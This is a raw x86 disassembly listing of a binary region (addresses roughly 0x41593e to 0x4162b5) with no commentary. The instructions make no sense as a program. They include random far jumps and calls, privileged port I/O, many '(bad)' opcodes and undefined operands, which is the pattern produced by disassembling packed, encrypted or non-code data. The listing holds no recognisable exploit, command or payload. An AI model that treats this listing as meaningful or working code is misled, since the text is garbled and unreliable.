  41593e:	jmp    0x37e0:0x2591cb31
  415945:	repnz mov ch,0x4a
  415948:	mov    cl,BYTE PTR [edi]
  41594a:	xchg   edx,eax
  41594b:	push   edi
  41594c:	inc    esp
  41594d:	popa   
  41594e:	cwde   
  41594f:	jle    0x4158d6
  415951:	dec    ebx
  415952:	es loope 0x4159cb
  415955:	pop    ebx
  415956:	xchg   ebx,eax
  415957:	test   al,0x5b
  415959:	xlat   BYTE PTR ds:[ebx]
  41595a:	push   ebp
  41595b:	inc    ebp
  41595c:	push   eax
  41595d:	sbb    esp,eax
  41595f:	call   FWORD PTR [ecx-0x6b]
  415962:	xor    ah,dl
  415964:	daa    
  415965:	arpl   WORD PTR [eax-0x30524b5f],di
  41596b:	jmp    0x490d:0x3c57d629
  415972:	les    edi,FWORD PTR [ecx-0x38e6ccb]
  415978:	fmul   DWORD PTR [ebx]
  41597a:	jmp    0x17d7b5ab
  41597f:	cmp    eax,ebx
  415981:	sbb    eax,0xce6661d4
  415986:	stos   DWORD PTR es:[edi],eax
  415987:	lock or DWORD PTR [eax+esi*2],eax
  41598b:	xor    BYTE PTR es:[ecx-0x28f62019],ah
  415992:	pop    ds
  415993:	ins    DWORD PTR es:[edi],dx
  415994:	pop    edi
  415995:	cli    
  415996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415997:	xlat   BYTE PTR ds:[ebx]
  415998:	pop    edi
  415999:	mov    DWORD PTR [ebp-0x3cc24f46],ecx
  41599f:	or     esi,edi
  4159a1:	out    dx,eax
  4159a2:	mov    dh,0xa7
  4159a4:	cmp    bl,bh
  4159a6:	stc    
  4159a7:	fnstcw WORD PTR [ecx]
  4159a9:	sub    BYTE PTR [ecx+0x191c21ee],0x33
  4159b0:	and    ebp,DWORD PTR [edi+0x6c2bd7ac]
  4159b6:	daa    
  4159b7:	push   esi
  4159b8:	xchg   edx,eax
  4159b9:	loop   0x415949
  4159bb:	pop    es
  4159bc:	call   0x3660:0xef0a08ed
  4159c3:	push   ecx
  4159c4:	es je  0x4159ad
  4159c7:	pop    ebx
  4159c8:	add    bh,bl
  4159ca:	or     cl,ch
  4159cc:	retf   0xeced
  4159cf:	jo     0x4159f0
  4159d1:	test   edx,ebp
  4159d3:	inc    edi
  4159d4:	dec    eax
  4159d5:	sbb    al,0xf4
  4159d7:	mov    dl,0x1a
  4159d9:	push   0x2091b9d8
  4159de:	cmp    dl,BYTE PTR [esp+ecx*8-0x15]
  4159e2:	adc    BYTE PTR [eax],bl
  4159e4:	jl     0x4159bf
  4159e6:	call   0x245194b2
  4159eb:	cmp    eax,0xbec4f96a
  4159f0:	push   esp
  4159f1:	(bad)  
  4159f2:	mov    ecx,0x5acada8b
  4159f7:	cmp    cl,al
  4159f9:	adc    dh,BYTE PTR [ecx-0x6d]
  4159fc:	popa   
  4159fd:	mov    al,0x49
  4159ff:	mov    ah,0xf5
  415a01:	inc    edi
  415a02:	xchg   ebx,eax
  415a03:	cwde   
  415a04:	ja     0x415a5f
  415a06:	adc    edi,esp
  415a08:	and    bh,al
  415a0a:	dec    edi
  415a0b:	ds pop ds
  415a0d:	arpl   bp,si
  415a0f:	xor    BYTE PTR [edx-0x6484e211],0x4b
  415a16:	retf   0x82e2
  415a19:	xchg   edi,eax
  415a1a:	repz call 0x722c8822
  415a20:	call   0xc3098ef7
  415a25:	cwde   
  415a26:	xor    cl,BYTE PTR [eax+edi*4+0x473786e9]
  415a2d:	ja     0x415a53
  415a2f:	lahf   
  415a30:	sub    dh,dh
  415a32:	xor    bh,BYTE PTR [edi-0x7b]
  415a35:	cmp    cl,dl
  415a37:	ficomp DWORD PTR [ebx+0xbf]
	...
  415c15:	add    ch,ch
  415c17:	jle    0x415c0b
  415c19:	ret    
  415c1a:	repz iret 
  415c1c:	std    
  415c1d:	jle    0x415bfe
  415c1f:	loope  0x415c63
  415c21:	mov    al,0x26
  415c23:	pop    ecx
  415c24:	loop   0x415c4d
  415c26:	push   ecx
  415c27:	popa   
  415c28:	add    DWORD PTR [eax],eax
  415c2a:	push   ds
  415c2b:	pop    es
  415c2c:	add    BYTE PTR [eax],al
  415c2e:	or     bl,BYTE PTR [edi+0x3def83cb]
  415c34:	mov    eax,ds:0xf28d7bad
  415c39:	jge    0x415c44
  415c3b:	and    DWORD PTR [edx],ebx
  415c3d:	dec    edx
  415c3e:	jle    0x415cb1
  415c40:	into   
  415c41:	cs in  eax,dx
  415c43:	cld    
  415c44:	scas   eax,DWORD PTR es:[edi]
  415c45:	add    edi,DWORD PTR [ebp-0x7f81897b]
  415c4b:	gs inc ecx
  415c4d:	dec    ecx
  415c4e:	push   esi
  415c4f:	fst    DWORD PTR [esi]
  415c51:	outs   dx,BYTE PTR gs:[esi]
  415c53:	repnz xor ecx,DWORD PTR [ebp-0x73]
  415c57:	add    DWORD PTR [esi+0x1acb9757],esp
  415c5d:	add    DWORD PTR [eax+0x3c],esi
  415c60:	pop    ecx
  415c61:	xchg   DWORD PTR [ebp-0x60],edi
  415c64:	fs or  ecx,0xa
  415c68:	int    0xdd
  415c6a:	xchg   ecx,eax
  415c6b:	lods   eax,DWORD PTR ds:[esi]
  415c6c:	fsub   DWORD PTR ds:0x25733244
  415c72:	popa   
  415c73:	retf   0xdb2c
  415c76:	rep lods eax,DWORD PTR ds:[esi]
  415c78:	push   0x8d253469
  415c7d:	lods   eax,DWORD PTR ds:[esi]
  415c7e:	pop    ebx
  415c7f:	mov    ch,0x33
  415c81:	xchg   ecx,eax
  415c82:	adc    eax,0x8dfa9613
  415c87:	loopne 0x415c53
  415c89:	xor    cl,ah
  415c8b:	sbb    eax,0x15509459
  415c90:	or     BYTE PTR [esi+0x73b429f6],0x35
  415c97:	pop    ss
  415c98:	mov    ebx,?
  415c9a:	fsubr  DWORD PTR [esi]
  415c9c:	aam    0xea
  415c9e:	pop    ebx
  415c9f:	stos   DWORD PTR es:[edi],eax
  415ca0:	sti    
  415ca1:	xor    al,0x4f
  415ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca4:	sbb    ebx,ebp
  415ca6:	in     eax,dx
  415ca7:	test   al,0x7c
  415ca9:	fs jle 0x415c72
  415cac:	pop    ebp
  415cad:	jne    0x415d0c
  415caf:	cmp    al,0xe6
  415cb1:	loope  0x415c9e
  415cb3:	jne    0x415d0a
  415cb5:	sbb    DWORD PTR [ebx*2-0x10c1d368],0x4dbac51c
  415cc0:	ret    0xaf16
  415cc3:	retf   
  415cc4:	int3   
  415cc5:	add    DWORD PTR [eax+0x1e],0x93e4b60b
  415ccc:	add    eax,0x231fe01a
  415cd1:	fistp  WORD PTR [ecx-0xb]
  415cd4:	cli    
  415cd5:	inc    ecx
  415cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd7:	mov    eax,ds:0x9f01610
  415cdc:	int    0xde
  415cde:	(bad)  
  415cdf:	xor    al,0xff
  415ce1:	loopne 0x415d19
  415ce3:	aad    0x3c
  415ce5:	and    DWORD PTR [ebx+0x11c634a0],ebx
  415ceb:	ss sub dh,bl
  415cee:	dec    ebx
  415cef:	dec    eax
  415cf0:	in     eax,0xe3
  415cf2:	les    edx,FWORD PTR [edi]
  415cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cf5:	mov    ebx,0x3a8969b8
  415cfa:	ins    DWORD PTR es:[edi],dx
  415cfb:	lea    edi,[ebp+esi*1-0x5]
  415cff:	inc    eax
  415d00:	mov    ebp,0x7ec4f35c
  415d05:	leave  
  415d06:	pop    esi
  415d07:	imul   edx,esp,0xfe6861cd
  415d0d:	push   cs
  415d0e:	xchg   esi,eax
  415d0f:	pop    esi
  415d10:	push   esi
  415d11:	hlt    
  415d12:	popf   
  415d13:	(bad)  
  415d14:	dec    BYTE PTR [esi-0x58]
  415d17:	push   ss
  415d18:	xchg   ch,dl
  415d1a:	jb     0x415d44
  415d1c:	sub    bh,ah
  415d1e:	mov    bl,0x4b
  415d20:	jle    0x415d34
  415d22:	int    0x95
  415d24:	inc    edx
  415d25:	(bad)  
  415d26:	(bad)  
  415d27:	scas   eax,DWORD PTR es:[edi]
  415d28:	add    BYTE PTR [edi+edi*4+0x6d],dh
  415d2c:	push   esp
  415d2d:	js     0x415d52
  415d2f:	test   DWORD PTR [esi+0x70],ebx
  415d32:	test   al,0xde
  415d34:	sub    BYTE PTR [eax],al
  415d36:	or     BYTE PTR ds:0xa47c92b,dl
  415d3c:	jmp    edi
  415d3e:	clc    
  415d3f:	cmp    esp,DWORD PTR [ecx-0xa6c9eae]
  415d45:	mov    eax,ds:0xe9de5c57
  415d4a:	mov    dh,0xd
  415d4c:	popa   
  415d4d:	add    BYTE PTR [edx-0x68],ch
  415d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d51:	push   ss
  415d52:	aaa    
  415d53:	adc    al,0x2a
  415d55:	lea    eax,[edi+0x2d]
  415d58:	pop    esp
  415d59:	dec    edi
  415d5a:	fcomi  st,st(5)
  415d5c:	mov    ds:0x9e7c1a3b,al
  415d61:	sbb    eax,DWORD PTR [ebx-0x7]
  415d64:	fisubr DWORD PTR ds:0xaaa784df
  415d6a:	pop    edi
  415d6b:	fdiv   QWORD PTR [ecx-0x7d]
  415d6e:	jg     0x415cf1
  415d70:	or     BYTE PTR [edi],bh
  415d72:	jno    0x415de7
  415d74:	nop
  415d75:	pop    edx
  415d76:	fcmovnbe st,st(3)
  415d78:	xor    ah,BYTE PTR [ebx+ebp*4-0x29]
  415d7c:	pop    eax
  415d7d:	das    
  415d7e:	jb     0x415dc5
  415d80:	dec    ebx
  415d81:	xor    ecx,eax
  415d83:	sbb    ebp,eax
  415d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d86:	sub    ebp,DWORD PTR [esi-0x5c73887c]
  415d8c:	push   0x4f7eca76
  415d91:	int    0xa9
  415d93:	dec    ebx
  415d94:	(bad)  
  415d95:	adc    al,0x13
  415d97:	sbb    cl,BYTE PTR [edi+eax*1]
  415d9a:	jne    0x415d57
  415d9c:	nop
  415d9d:	inc    ebx
  415d9e:	mov    DWORD PTR [eax],0xc99b9d98
  415da4:	and    eax,0xac7b35fb
  415da9:	adc    DWORD PTR ds:0x76ddb9bc,esp
  415daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db0:	aad    0x8
  415db2:	cs cmc 
  415db4:	and    edi,DWORD PTR [ebx]
  415db6:	clc    
  415db7:	loope  0x415de3
  415db9:	dec    edx
  415dba:	mov    al,ds:0xa4457b6e
  415dbf:	or     BYTE PTR [esi],ah
  415dc1:	jecxz  0x415e05
  415dc3:	inc    ebp
  415dc4:	sub    eax,0xd5edb4ab
  415dc9:	dec    ecx
  415dca:	dec    esp
  415dcb:	retf   
  415dcc:	fnstenv [ebx]
  415dce:	(bad)
  415dd1:	popf   
  415dd2:	loopne 0x415e31
  415dd4:	enter  0xa227,0xb4
  415dd8:	jno    0x415e47
  415dda:	sub    al,0x4f
  415ddc:	nop
  415ddd:	(bad)  
  415dde:	(bad)  [ecx]
  415de0:	mov    eax,ebx
  415de2:	jg     0x415e1c
  415de4:	add    dl,cl
  415de6:	xchg   ecx,eax
  415de7:	data16 sub al,0x33
  415dea:	call   0x7e4f259f
  415def:	mov    BYTE PTR [edi-0x3505d54a],dh
  415df5:	mov    esi,0x60bdc974
  415dfa:	out    0xd6,al
  415dfc:	mov    ebx,0x15c564c8
  415e01:	mov    cl,BYTE PTR [eax]
  415e03:	clc    
  415e04:	sbb    bh,BYTE PTR [ebx+0x14dcfd2e]
  415e0a:	in     al,dx
  415e0b:	(bad)  
  415e0c:	mov    ch,0xbe
  415e0e:	sub    ebx,edi
  415e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e11:	addr16 mov al,ds:0x70bf
  415e15:	xchg   esi,eax
  415e16:	dec    ebp
  415e17:	ins    DWORD PTR es:[edi],dx
  415e18:	mov    ds,edx
  415e1a:	sub    eax,0xe3ec376
  415e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e20:	sub    al,0x6d
  415e22:	mov    bl,0xc2
  415e24:	cli    
  415e25:	mov    esp,0x9d9c4422
  415e2a:	sbb    BYTE PTR [ecx-0x75],bh
  415e2d:	or     ah,BYTE PTR [edx+edx*1-0x71589e84]
  415e34:	fwait
  415e35:	push   0x495a7453
  415e3a:	jmp    0xd039:0x3a3dff34
  415e41:	sbb    BYTE PTR [edi+0x2cc43375],bh
  415e47:	mov    dl,0xcf
  415e49:	add    DWORD PTR [ecx+0x258b6477],esp
  415e4f:	outs   dx,BYTE PTR ds:[esi]
  415e50:	ins    BYTE PTR es:[edi],dx
  415e51:	pop    es
  415e52:	push   ecx
  415e53:	fstp   TBYTE PTR [edx]
  415e55:	pop    ecx
  415e56:	gs pop eax
  415e58:	addr16 mov cs,eax
  415e5b:	pop    edx
  415e5c:	popa   
  415e5d:	mov    ch,0xec
  415e5f:	fild   DWORD PTR [ebx]
  415e61:	add    BYTE PTR [eax+0x2a497ade],0x9e
  415e68:	pusha  
  415e69:	test   BYTE PTR cs:[ebx],bh
  415e6c:	xchg   ecx,eax
  415e6d:	stos   BYTE PTR es:[edi],al
  415e6e:	bound  edi,QWORD PTR [edx+esi*4-0x375d2aae]
  415e75:	jle    0x415e4d
  415e77:	lea    esp,[edi+0x64914be2]
  415e7d:	inc    BYTE PTR [ebx+ecx*4]
  415e80:	gs dec edi
  415e82:	pop    es
  415e83:	add    edx,DWORD PTR [ecx+edx*1+0x49d8aee6]
  415e8a:	xchg   ebp,eax
  415e8b:	rcr    dh,1
  415e8d:	fldenv [edx]
  415e8f:	retf   0xd0d3
  415e92:	mov    bh,0x45
  415e94:	jle    0x415e67
  415e96:	pop    es
  415e97:	retf   0x8679
  415e9a:	mov    esp,0x36371caf
  415e9f:	xor    DWORD PTR [edx+eiz*4-0x1ca58a5a],0xf
  415ea7:	xor    al,0x63
  415ea9:	test   eax,0x8dc32057
  415eae:	mov    ch,BYTE PTR [edi]
  415eb0:	mov    esi,0xe5f93ecd
  415eb5:	sub    DWORD PTR [esi-0x11],esi
  415eb8:	test   BYTE PTR [ecx+0x14],dl
  415ebb:	adc    BYTE PTR [ebx],bl
  415ebd:	adc    esp,DWORD PTR [ecx-0x56]
  415ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec1:	mov    dh,dl
  415ec3:	push   esi
  415ec4:	retf   0x8eb3
  415ec7:	fs pop eax
  415ec9:	jae    0x415e74
  415ecb:	test   al,0x95
  415ecd:	fbld   TBYTE PTR [ebx]
  415ecf:	cmp    eax,0x3a3dde3e
  415ed4:	jl     0x415e57
  415ed6:	dec    esp
  415ed7:	dec    ebx
  415ed8:	js     0x415e7c
  415eda:	ja     0x415ed5
  415edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415edd:	loopne 0x415e89
  415edf:	jae    0x415ec1
  415ee1:	add    al,0x91
  415ee3:	jb     0x415ea6
  415ee5:	pop    ds
  415ee6:	add    BYTE PTR [eax+ecx*1],dh
  415ee9:	mov    edx,0x9c99b2ff
  415eee:	popa   
  415eef:	xchg   esi,eax
  415ef0:	out    0x7d,eax
  415ef2:	xor    al,0x6
  415ef4:	xchg   edi,eax
  415ef5:	addr16 push ebx
  415ef7:	cdq    
  415ef8:	fldenv [eax+0x2185587f]
  415efe:	fild   DWORD PTR [ebp-0xa]
  415f01:	ret    
  415f02:	test   DWORD PTR [eax-0xd],eax
  415f05:	popa   
  415f06:	popa   
  415f07:	cmp    eax,0xddd5e854
  415f0c:	mov    ah,0x33
  415f0e:	add    al,0x74
  415f10:	or     DWORD PTR [eax-0x1c7bd371],0xdeb7845e
  415f1a:	xchg   ecx,eax
  415f1b:	ja     0x415f44
  415f1d:	retf   0x28fd
  415f20:	fisttp WORD PTR [edi]
  415f22:	loop   0x415ea7
  415f24:	mov    DWORD PTR [eax],edi
  415f26:	loope  0x415f90
  415f28:	mov    esp,0x473c4ee1
  415f2d:	out    dx,al
  415f2e:	jecxz  0x415f63
  415f30:	push   es
  415f31:	add    ebx,DWORD PTR [ebp-0x3c6e4cae]
  415f37:	cmc    
  415f38:	mov    eax,0x8d52a8aa
  415f3d:	jne    0x415ed4
  415f3f:	and    dh,BYTE PTR [eax+0x7092491]
  415f45:	mov    esi,DWORD PTR [ebp-0x49]
  415f48:	mov    al,ds:0x3810faa7
  415f4d:	(bad)  
  415f4e:	lea    esi,[ecx]
  415f50:	xchg   BYTE PTR [ebp+0x5b285150],dh
  415f56:	jns    0x415eda
  415f58:	mov    edx,0xa0021879
  415f5d:	mov    ecx,0xc17e3b81
  415f62:	mov    edi,edi
  415f64:	dec    eax
  415f65:	push   eax
  415f67:	je     0x415fc5
  415f69:	ds cmp bh,ch
  415f6c:	mov    edx,0x62834905
  415f71:	sbb    bl,BYTE PTR [ecx]
  415f73:	sti    
  415f74:	pop    edi
  415f75:	ins    BYTE PTR es:[edi],dx
  415f76:	(bad)  [ebx+0x55]
  415f79:	shl    BYTE PTR gs:[edi],0x45
  415f7d:	sbb    cl,BYTE PTR [eax+edi*1+0x1eace816]
  415f84:	push   ds
  415f85:	leave  
  415f86:	test   DWORD PTR [ebx],0x299c6c7c
  415f8c:	test   edi,0x8ec2e2d1
  415f92:	adc    esp,0x2b397d82
  415f98:	mov    esi,0x9cd757b
  415f9d:	iret   
  415f9e:	jne    0x415f34
  415fa0:	sub    al,0xf8
  415fa2:	scas   eax,DWORD PTR es:[edi]
  415fa3:	dec    ecx
  415fa4:	push   ebx
  415fa5:	xor    bl,BYTE PTR [esi]
  415fa7:	in     eax,dx
  415fa8:	mov    edi,0xca237637
  415fad:	popa   
  415fae:	cmp    ecx,DWORD PTR [edi+0x57]
  415fb1:	pusha  
  415fb2:	add    BYTE PTR [eax],bl
  415fb4:	arpl   WORD PTR [edi+edx*8-0x2f],bx
  415fb8:	aam    0xf8
  415fba:	or     BYTE PTR [esi],ch
  415fbc:	stos   BYTE PTR es:[edi],al
  415fbd:	and    eax,0xea16cb33
  415fc2:	ins    BYTE PTR es:[edi],dx
  415fc3:	xchg   BYTE PTR [esi+0x79],ch
  415fc6:	cwde   
  415fc7:	or     ah,dl
  415fc9:	mov    ebx,0xb2a20dce
  415fce:	sub    dh,BYTE PTR [esi+0x20856d56]
  415fd4:	pop    edx
  415fd5:	imul   edi,edi,0xffffffd2
  415fd8:	jns    0x415fe2
  415fda:	sub    al,0xe
  415fdc:	test   DWORD PTR [ebp+0x58],0xeb1c2e08
  415fe3:	pushf  
  415fe4:	cmp    al,0x17
  415fe6:	pushf  
  415fe7:	sti    
  415fe8:	stc    
  415fe9:	dec    edi
  415fea:	je     0x415ffa
  415fec:	dec    edi
  415fed:	(bad)  
  415fee:	fidiv  DWORD PTR [ebx-0xdd5bc4f]
  415ff4:	jmp    0x7aa1:0x20389d8b
  415ffb:	xor    BYTE PTR [eax-0x33],bl
  415ffe:	sub    DWORD PTR [edi+0x2d9aebf7],eax
  416004:	jbe    0x416072
  416006:	scas   al,BYTE PTR es:[edi]
  416007:	cmc    
  416008:	ss (bad) 
  41600b:	xchg   edi,eax
  41600c:	inc    ecx
  41600d:	mov    edx,esi
  41600f:	fwait
  416010:	das    
  416011:	gs jns 0x416080
  416014:	cld    
  416015:	aam    0xc3
  416017:	call   FWORD PTR [edi]
  416019:	sbb    DWORD PTR [esi-0x3b],eax
  41601c:	int3   
  41601d:	out    0xca,al
  41601f:	inc    ecx
  416020:	xchg   esi,eax
  416021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416022:	hlt    
  416023:	xor    ah,BYTE PTR [eax-0x4af8eeff]
  416029:	out    0x8d,eax
  41602b:	mov    ?,WORD PTR [ecx-0x1d]
  41602e:	(bad)  
  41602f:	lods   eax,DWORD PTR ds:[esi]
  416030:	je     0x416072
  416032:	ds xor dh,cl
  416035:	dec    edi
  416036:	dec    edi
  416037:	sub    ebx,DWORD PTR [bp+si-0x4b70]
  41603c:	mov    ch,0x7b
  41603e:	xor    BYTE PTR [edx+0xa],bh
  416041:	sbb    BYTE PTR [ebp-0x701b0a9e],al
  416047:	in     al,dx
  416048:	shl    DWORD PTR [esi-0x21],cl
  41604b:	mov    eax,ds:0x81f552a8
  416050:	or     eax,0xd16b032c
  416055:	mov    edx,0xf19664b7
  41605a:	jnp    0x4160c1
  41605c:	add    ch,cl
  41605e:	mov    ch,0xa4
  416060:	pusha  
  416061:	dec    BYTE PTR [esi+0x6f417cd4]
  416067:	cs daa 
  416069:	test   DWORD PTR [ecx+0x8],edi
  41606c:	repz jnp 0x416055
  41606f:	mov    al,ds:0x1cd48f5e
  416074:	and    BYTE PTR [esi],dl
  416076:	addr16 out dx,eax
  416078:	fcom   DWORD PTR [esi+0x3b]
  41607b:	cld    
  41607c:	jo     0x4160d9
  41607e:	scas   al,BYTE PTR es:[edi]
  41607f:	pop    eax
  416080:	rcr    BYTE PTR [eax],cl
  416082:	jg     0x4160ee
  416084:	fsubr  st(4),st
  416086:	mov    ecx,0xbeeee9f9
  41608b:	jbe    0x4160f3
  41608d:	sbb    ecx,DWORD PTR [ecx+0x187ee70]
  416093:	pop    esp
  416094:	dec    esi
  416095:	fsub   QWORD PTR [esi]
  416097:	push   ds
  416098:	xchg   BYTE PTR ds:[esi],dl
  41609b:	push   ss
  41609c:	adc    ebp,DWORD PTR [ecx]
  41609e:	sar    DWORD PTR [eax],cl
  4160a0:	cmp    al,0x59
  4160a2:	fstp   DWORD PTR [esi+0x14]
  4160a5:	out    dx,eax
  4160a6:	in     al,dx
  4160a7:	je     0x416070
  4160a9:	push   ebx
  4160aa:	es aas 
  4160ac:	repnz aaa 
  4160ae:	outs   dx,BYTE PTR ds:[esi]
  4160af:	rcl    DWORD PTR [edx-0x6339b02f],1
  4160b5:	nop
  4160b6:	or     ebp,eax
  4160b8:	scas   eax,DWORD PTR es:[edi]
  4160b9:	mov    dh,0x78
  4160bb:	dec    ebx
  4160bc:	jmp    0xed10:0xb3fd87cd
  4160c3:	mov    esi,0xdcbe460d
  4160c8:	(bad)  
  4160c9:	out    0xe2,eax
  4160cb:	and    BYTE PTR [ebp+0x7b215792],cl
  4160d1:	in     al,0xe7
  4160d3:	lods   al,BYTE PTR ds:[esi]
  4160d4:	and    al,ah
  4160d6:	data16 jg 0x416081
  4160d9:	mov    ds:0x83856118,al
  4160de:	es aas 
  4160e0:	mov    bh,0x7c
  4160e2:	gs nop
  4160e4:	sar    DWORD PTR [ecx+0x14248b5f],cl
  4160ea:	mov    WORD PTR [esi-0x4eea6cd0],fs
  4160f0:	lea    ebp,[ecx-0x78]
  4160f3:	pop    edi
  4160f4:	dec    eax
  4160f5:	retf   
  4160f6:	jo     0x41611f
  4160f8:	outs   dx,DWORD PTR ds:[esi]
  4160f9:	push   edx
  4160fa:	xchg   BYTE PTR [ebp-0x5b],cl
  4160fd:	mov    eax,ds:0x813f98e4
  416102:	xchg   esp,eax
  416103:	push   ebx
  416104:	rcr    BYTE PTR [ecx],cl
  416106:	xchg   edx,eax
  416107:	or     ebx,0x30560cd8
  41610d:	int    0xa3
  41610f:	dec    edi
  416110:	adc    eax,0xe30fc137
  416115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416116:	(bad)  
  416118:	test   DWORD PTR [eax],ebx
  41611a:	xor    al,0xf2
  41611c:	sbb    al,0x55
  41611e:	push   esp
  41611f:	jns    0x4160a7
  416121:	out    0xdc,al
  416123:	lahf   
  416124:	out    dx,al
  416125:	outs   dx,BYTE PTR ds:[esi]
  416126:	scas   eax,DWORD PTR es:[edi]
  416127:	das    
  416128:	mov    al,ds:0x7cb87592
  41612d:	sahf   
  41612e:	sbb    DWORD PTR [edi+eiz*1],ebp
  416131:	push   ss
  416132:	jne    0x416169
  416134:	loope  0x416155
  416136:	xor    ebx,ebp
  416138:	jae    0x4160e6
  41613a:	je     0x4161b2
  41613c:	mov    dl,0x6b
  41613e:	inc    edx
  41613f:	add    esp,DWORD PTR [edx+0x3cbc59f9]
  416145:	push   0x12
  416147:	add    al,0xb5
  416149:	pop    esp
  41614a:	push   ds
  41614b:	fsubr  QWORD PTR [ebp+0x6]
  41614e:	mov    edx,0xd70aaedc
  416153:	aam    0x45
  416155:	js     0x4160f8
  416157:	cli    
  416158:	or     ecx,ebx
  41615a:	aad    0x91
  41615c:	dec    esi
  41615d:	xor    BYTE PTR [edi-0x52a5395c],dl
  416163:	push   edi
  416164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416165:	sbb    edi,ebp
  416167:	imul   esi,esp,0xfffffffc
  41616a:	mov    fs,WORD PTR [eax]
  41616c:	push   edx
  41616d:	ins    BYTE PTR es:[edi],dx
  41616e:	sub    DWORD PTR [esi+0xa01a383],ebx
  416174:	retf   0x3aa1
  416177:	mov    ebp,0x4fa54bb6
  41617c:	pop    esi
  41617d:	jle    0x41612f
  41617f:	in     eax,dx
  416180:	loope  0x4161b0
  416182:	xchg   ebp,eax
  416183:	cs aam 0x43
  416186:	pop    ss
  416187:	popf   
  416188:	out    dx,al
  416189:	hlt    
  41618a:	mov    DWORD PTR ds:0x176ca850,esi
  416190:	mov    ch,0x71
  416192:	jno    0x416186
  416194:	das    
  416195:	mov    dh,0x86
  416197:	inc    eax
  416198:	mov    BYTE PTR [eax-0x9],0xbc
  41619c:	cld    
  41619d:	inc    ebp
  41619e:	inc    ecx
  41619f:	adc    ecx,DWORD PTR [eax]
  4161a1:	bound  ecx,QWORD PTR [ebx]
  4161a3:	shl    DWORD PTR [edi],cl
  4161a5:	adc    al,0x26
  4161a7:	dec    eax
  4161a8:	daa    
  4161a9:	mov    cl,0x85
  4161ab:	ret    0xd68a
  4161ae:	call   0xe75620db
  4161b3:	pop    ss
  4161b4:	mov    BYTE PTR fs:[eax+0x7ba43c17],dh
  4161bb:	mov    dh,0xe7
  4161bd:	or     eax,0x9f77a653
  4161c2:	leave  
  4161c3:	jl     0x416176
  4161c5:	cli    
  4161c6:	jg     0x4161cd
  4161c8:	jl     0x416185
  4161ca:	out    dx,eax
  4161cb:	adc    ah,BYTE PTR [eax+ecx*2+0x6e]
  4161cf:	je     0x416191
  4161d1:	outs   dx,BYTE PTR ds:[esi]
  4161d2:	jecxz  0x41618d
  4161d4:	push   ebx
  4161d5:	pop    ecx
  4161d6:	js     0x4161d4
  4161d8:	ins    BYTE PTR es:[edi],dx
  4161d9:	inc    eax
  4161da:	call   0x4cc:0xd752c702
  4161e1:	gs pop edi
  4161e3:	sub    esp,esp
  4161e5:	sar    ebp,0x42
  4161e8:	push   edi
  4161e9:	push   edi
  4161ea:	pop    esp
  4161eb:	mov    bh,0x18
  4161ed:	nop    DWORD PTR [ebp-0x39]
  4161f1:	pop    ds
  4161f2:	in     eax,0x9e
  4161f4:	in     eax,0x70
  4161f6:	clc    
  4161f7:	and    DWORD PTR [esi],edi
  4161f9:	push   ebp
  4161fa:	loope  0x4161aa
  4161fc:	lock cmp eax,0xbad242d0
  416202:	gs push 0xffffffa6
  416205:	int3   
  416206:	dec    ecx
  416207:	jge    0x41626d
  416209:	mov    eax,DWORD PTR [esi+0x50]
  41620c:	mov    WORD PTR [eax-0x6b],ds
  41620f:	ds add cl,dl
  416212:	push   cs
  416213:	stos   BYTE PTR es:[edi],al
  416214:	mov    eax,ss:0xf4485a90
  41621a:	add    al,0xba
  41621c:	dec    edx
  41621d:	das    
  41621e:	shl    BYTE PTR [edi+0x38ef16cd],1
  416224:	jb     0x4161c4
  416226:	xor    ecx,DWORD PTR [ebx]
  416228:	(bad)  
  416229:	xor    ch,BYTE PTR [edi]
  41622b:	mov    edi,0xca8344d8
  416230:	ds test eax,0xdb799947
  416236:	test   al,0xd3
  416238:	cld    
  416239:	in     al,dx
  41623a:	aas    
  41623b:	xchg   edx,eax
  41623c:	xchg   DWORD PTR [edi+0x51],edx
  41623f:	in     al,0xd4
  416241:	sar    BYTE PTR [eax-0x29],1
  416244:	push   0x5540d3e
  416249:	mov    al,ds:0x32f76f7c
  41624e:	int3   
  41624f:	fbld   TBYTE PTR [ecx]
  416251:	xchg   esi,eax
  416252:	outs   dx,DWORD PTR ds:[esi]
  416253:	lds    eax,FWORD PTR [edi-0x1e]
  416256:	xchg   esi,eax
  416257:	mov    cl,BYTE PTR [ebx+0x8]
  41625a:	loop   0x4162a0
  41625c:	adc    DWORD PTR [ebx],ecx
  41625e:	xchg   edx,eax
  41625f:	sti    
  416260:	mov    ds:0x36d18c49,al
  416265:	pusha  
  416266:	mov    ss,WORD PTR [eax+edi*8+0x39]
  41626a:	and    BYTE PTR [edi+0x6f4e8242],0x6
  416271:	sub    ebp,DWORD PTR [ebx-0x1279829d]
  416277:	xor    al,0xf2
  416279:	pop    ebx
  41627a:	xor    DWORD PTR [eax+0x52],ebp
  41627d:	popa   
  41627e:	xor    ah,BYTE PTR [edx+0x10030048]
  416284:	add    DWORD PTR [eax],ebp
  416286:	ja     0x416234
  416288:	push   ss
  416289:	xor    ecx,DWORD PTR [edx]
  41628b:	sub    al,0xd0
  41628d:	mov    edx,0x620d724d
  416292:	clc    
  416293:	push   ebp
  416295:	sub    edi,DWORD PTR [edx-0x18]
  416298:	jns    0x4162ee
  41629a:	lock jae 0x416234
  41629d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629e:	mov    ebp,0x9085acc9
  4162a3:	lock iret 
  4162a5:	push   esi
  4162a6:	jecxz  0x416228
  4162a8:	pop    ds
  4162a9:	adc    eax,0x75a8255d
  4162ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162af:	mov    ds:0x3fb3df73,eax
  4162b4:	dec    ebx
  4162b5:	in     eax,0xc5
